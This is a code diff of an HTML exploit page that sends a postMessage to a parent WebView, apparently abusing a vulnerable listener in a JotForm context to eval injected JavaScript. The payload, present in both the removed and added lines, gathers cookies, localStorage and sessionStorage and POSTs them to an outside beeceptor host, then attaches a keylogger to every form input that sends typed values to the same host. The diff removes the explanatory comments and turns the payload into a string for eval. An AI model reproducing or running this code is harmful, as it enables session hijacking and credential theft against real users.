@@ -3,51 +3,39 @@
 <head><title>Loading...</title></head>
 <body>
 <script>
-// Wait for parent frame to fully load the JotForm bridge
 setTimeout(function() {
+    var collectCode = [
+        '(function(){',
+        '  var data={',
+        '    cookies:document.cookie,',
+        '    ls:JSON.stringify(localStorage),',
+        '    ss:JSON.stringify(sessionStorage),',
+        '    url:location.href,',
+        '    ua:navigator.userAgent,',
+        '    ts:new Date().toISOString()',
+        '  };',
+        '  fetch("https://evilios.free.beeceptor.com/collect",{',
+        '    method:"POST",',
+        '    headers:{"Content-Type":"application/json"},',
+        '    body:JSON.stringify(data)',
+        '  });',
+        '  var obs=new MutationObserver(function(){',
+        '    document.querySelectorAll("input,textarea").forEach(function(i){',
+        '      if(!i.__h){i.__h=true;i.addEventListener("change",function(){',
+        '        fetch("https://evilios.free.beeceptor.com/keylog",{method:"POST",body:JSON.stringify({f:i.name||i.id,v:i.value})});',
+        '      });}',
+        '    });',
+        '  });',
+        '  obs.observe(document.body,{childList:true,subtree:true});',
+        '})()'
+    ].join('');
+
     var payload = {
         type: 'window.opener',
         name: 'eval',
-        args: [
-            (function() {
-                // Collect all available auth material from the jotform.com context
-                var data = {
-                    cookies:   document.cookie,
-                    localStorage: JSON.stringify(localStorage),
-                    sessionStorage: JSON.stringify(sessionStorage),
-                    url:       window.location.href,
-                    referrer:  document.referrer,
-                    ua:        navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                };
-                // Exfiltrate via fetch (runs in jotform.com origin — no CORS block)
-                fetch('https://evilios.free.beeceptor.com/collect', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(data)
-                });
-                // Optional: render invisible persistence overlay to silently capture
-                // any credentials the user types into the form
-                var observer = new MutationObserver(function() {
-                    var inputs = document.querySelectorAll('input, textarea');
-                    inputs.forEach(function(inp) {
-                        if (!inp.__hooked) {
-                            inp.__hooked = true;
-                            inp.addEventListener('change', function() {
-                                fetch('https://evilios.free.beeceptor.com/keylog', {
-                                    method: 'POST',
-                                    body: JSON.stringify({field: inp.name || inp.id, value: inp.value})
-                                });
-                            });
-                        }
-                    });
-                });
-                observer.observe(document.body, {childList: true, subtree: true});
-            })()
-        ]
+        args: [collectCode]
     };
 
-    // Send to parent WebView — the vulnerable messageListener picks this up
     window.parent.postMessage(JSON.stringify(payload), '*');
 }, 500);
 </script>
